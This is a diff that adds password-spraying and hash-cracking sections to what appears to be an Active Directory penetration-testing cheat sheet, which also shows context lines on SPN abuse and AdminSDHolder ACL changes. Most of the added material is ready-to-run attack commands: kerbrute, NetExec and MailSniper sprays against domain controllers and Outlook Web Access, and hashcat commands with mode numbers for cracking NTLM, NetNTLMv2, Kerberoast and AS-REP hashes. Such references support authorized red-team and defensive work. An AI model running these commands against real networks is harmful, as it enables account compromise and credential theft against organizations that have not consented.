@@ -301,6 +301,53 @@ Set-DomainObject -Identity <user> -Set @{serviceprincipalname="fake/NOTHING"}
 # Modify AdminSDHolder ACL — propagated every 60 minutes to all protected groups
 ```
 
+## Password Spraying
+
+Once you have a list of valid usernames, try common passwords — carefully respecting lockout policies:
+
+```bash
+# Kerbrute password spray (Kerberos — faster, less noisy than LDAP)
+kerbrute passwordspray -d domain.local --dc <DC_IP> users.txt 'Password123!'
+
+# NetExec (SMB)
+netexec smb <DC_IP> -u users.txt -p 'Summer2024!' --continue-on-success
+
+# NetExec (LDAP)
+netexec ldap <DC_IP> -u users.txt -p 'Password1' --continue-on-success
+
+# OWA spray via MailSniper
+Invoke-PasswordSprayOWA -ExchHostname <ip> -UserList valid.txt -Password 'Summer2024!'
+```
+
+<Warning>
+Check the domain password policy before spraying to avoid account lockouts: `Get-DomainPolicy` or `net accounts /domain`
+</Warning>
+
+## Hash Cracking Reference
+
+After capturing hashes, crack them offline with hashcat:
+
+| Hash Type | Hashcat Mode |
+|---|---|
+| NTLM | `1000` |
+| NetNTLMv1 | `5500` |
+| NetNTLMv2 | `5600` |
+| Kerberoast (TGS-REP) | `13100` |
+| AS-REP Roast | `18200` |
+| DCC (Domain Cached Credentials) | `1100` |
+| DCC2 (MS-CACHE v2) | `2100` |
+
+```bash
+# Crack NetNTLMv2
+hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule
+
+# Crack Kerberoast TGS
+hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt
+
+# Crack AS-REP hashes
+hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
 ## References
 
 - [BloodHound](https://github.com/BloodHoundAD/BloodHound)
